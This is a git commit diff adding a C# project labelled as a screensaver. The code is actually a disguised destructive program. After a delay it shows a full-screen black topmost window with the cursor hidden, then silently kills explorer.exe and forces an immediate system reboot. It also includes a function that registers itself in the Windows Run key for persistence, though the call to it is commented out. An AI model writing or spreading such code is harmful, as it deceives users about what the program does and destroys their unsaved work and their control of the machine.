33cc9c59f4bdb0fefd27032cbd3a960c735aae49
ShortArrow <bamboogeneral@live.jp>
2021-10-11 08:41:30 +0900

    first commit

---
+++ ScreenSaver001/Form1.Designer.cs
@@ -0,0 +1,54 @@
+﻿namespace ScreenSaver001 {
+    partial class _ {
+        /// <summary>
+        /// 必要なデザイナー変数です。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 使用中のリソースをすべてクリーンアップします。
+        /// </summary>
+        /// <param name="disposing">マネージ リソースを破棄する場合は true を指定し、その他の場合は false を指定します。</param>
+        protected override void Dispose(bool disposing) {
+            if (disposing && (components != null)) {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows フォーム デザイナーで生成されたコード
+
+        /// <summary>
+        /// デザイナー サポートに必要なメソッドです。このメソッドの内容を
+        /// コード エディターで変更しないでください。
+        /// </summary>
+        private void InitializeComponent() {
+            this.SuspendLayout();
+            // 
+            // _
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Black;
+            this.ClientSize = new System.Drawing.Size(284, 261);
+            this.ControlBox = false;
+            this.Cursor = System.Windows.Forms.Cursors.WaitCursor;
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.ImeMode = System.Windows.Forms.ImeMode.Disable;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "_";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.SizeGripStyle = System.Windows.Forms.SizeGripStyle.Hide;
+            this.TopMost = true;
+            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
+            this.Shown += new System.EventHandler(this.blackCurtainLoaded);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+    }
+}
+
---
+++ ScreenSaver001/Form1.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+using System.Diagnostics;
+
+namespace ScreenSaver001 {
+    public partial class _ : Form {
+        public _() {
+//            SetCurrentVersionRun();
+            //一秒間（1000ミリ秒）停止する
+            System.Threading.Thread.Sleep(60000);
+            Cursor.Hide();
+            InitializeComponent();
+        }
+        private void comander(string filename, string arguments) {
+            ProcessStartInfo psi = new ProcessStartInfo();
+            psi.FileName = filename;
+            //コマンドラインを指定
+            psi.Arguments = arguments;
+            //ウィンドウを表示しないようにする
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            //起動
+            Process p = Process.Start(psi);
+        }
+
+        private void blackCurtainLoaded(object sender, EventArgs e) {
+            
+            comander("taskkill.exe", "/f /im explorer.exe");
+
+            //一秒間（1000ミリ秒）停止する
+            System.Threading.Thread.Sleep(10000);
+
+            comander("shutdown.exe", "/r /f /t 0");
+        }
+        /// <summary>
+        /// CurrentUserのRunにアプリケーションの実行ファイルパスを登録する
+        /// </summary>
+        public static void SetCurrentVersionRun() {
+            //Runキーを開く
+            Microsoft.Win32.RegistryKey regkey =
+                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
+                @"Software\Microsoft\Windows\CurrentVersion\Run", true);
+            //値の名前に製品名、値のデータに実行ファイルのパスを指定し、書き込む
+            regkey.SetValue(Application.ProductName, Application.ExecutablePath);
+            //閉じる
+            regkey.Close();
+        }
+    }
+}
